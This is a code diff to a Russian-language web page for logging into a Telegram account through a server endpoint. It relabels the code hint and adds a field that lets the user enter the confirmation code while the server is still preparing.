@@ -34,7 +34,7 @@ body {{ font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Helvetica,Aria
   </div>
 
   <div id="step-code" class="login-form" style="display:none">
-    <div class="login-hint">Код из SMS</div>
+    <div class="login-hint">Код из Telegram</div>
     <input type="text" id="code" placeholder="12345" maxlength="6" inputmode="numeric"
            onkeydown="if(event.key===\'Enter\')authCode()">
     <button onclick="authCode()">Подтвердить</button>
@@ -52,6 +52,12 @@ body {{ font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Helvetica,Aria
   <div id="step-loading" class="login-form" style="display:none">
     <div class="login-hint" id="loading-text">Отправка кода...</div>
     <div class="login-timer" id="loading-timer">0s</div>
+    <div id="early-code" style="display:none;margin-top:16px">
+      <div class="login-hint">Код пришёл в Telegram? Введите:</div>
+      <input type="text" id="early-code-input" placeholder="12345" maxlength="6" inputmode="numeric"
+             onkeydown="if(event.key===\'Enter\')earlyCodeSubmit()">
+      <button id="early-code-btn" onclick="earlyCodeSubmit()" disabled>Ожидание сервера...</button>
+    </div>
   </div>
 </div>
 
@@ -62,6 +68,9 @@ var pollCount = 0;
 var pollTimer = null;
 var loadingSeconds = 0;
 var loadingTimer = null;
+var earlyCodeTimer = null;
+var serverReady = false;
+var earlyCode = \'\';
 
 function showStep(name) {{
   [\'phone\',\'code\',\'2fa\',\'loading\'].forEach(function(s) {{
@@ -83,6 +92,22 @@ function showLoading(text) {{
 
 function stopLoading() {{
   if (loadingTimer) {{ clearInterval(loadingTimer); loadingTimer = null; }}
+  if (earlyCodeTimer) {{ clearTimeout(earlyCodeTimer); earlyCodeTimer = null; }}
+  document.getElementById(\'early-code\').style.display = \'none\';
+}}
+
+function earlyCodeSubmit() {{
+  var code = document.getElementById(\'early-code-input\').value.trim();
+  if (!code) return;
+  if (serverReady) {{
+    document.getElementById(\'code\').value = code;
+    stopLoading();
+    showStep(\'code\');
+    authCode();
+  }} else {{
+    earlyCode = code;
+    document.getElementById(\'early-code-btn\').textContent = \'Код сохранён, ожидание...\';
+  }}
 }}
 
 function authStart() {{
@@ -90,7 +115,13 @@ function authStart() {{
   if (!phone) return;
   document.getElementById(\'phone-error\').textContent = \'\';
   currentPhone = phone;
+  serverReady = false;
+  earlyCode = \'\';
   showLoading(\'Отправка кода...\');
+  earlyCodeTimer = setTimeout(function() {{
+    document.getElementById(\'early-code\').style.display = \'\';
+    document.getElementById(\'early-code-input\').focus();
+  }}, 5000);
   fetch(\'/login/tg\', {{method:\'POST\', headers:{{\'Content-Type\':\'application/json\'}}, body:JSON.stringify({{action:\'auth_start\', phone:phone}})}})
     .then(function(r) {{ return r.json(); }})
     .then(function(d) {{
@@ -105,6 +136,16 @@ function authStart() {{
       pollStatus(function(resp) {{
         stopLoading();
         if (resp.auth_status === \'code_required\' || resp.status === \'ready\') {{
+          serverReady = true;
+          var ecBtn = document.getElementById(\'early-code-btn\');
+          ecBtn.disabled = false;
+          ecBtn.textContent = \'Подтвердить\';
+          if (earlyCode) {{
+            document.getElementById(\'code\').value = earlyCode;
+            showStep(\'code\');
+            authCode();
+            return;
+          }}
           showStep(\'code\');
           document.getElementById(\'code\').focus();
         }} else if (resp.auth_status === \'flood_wait\') {{
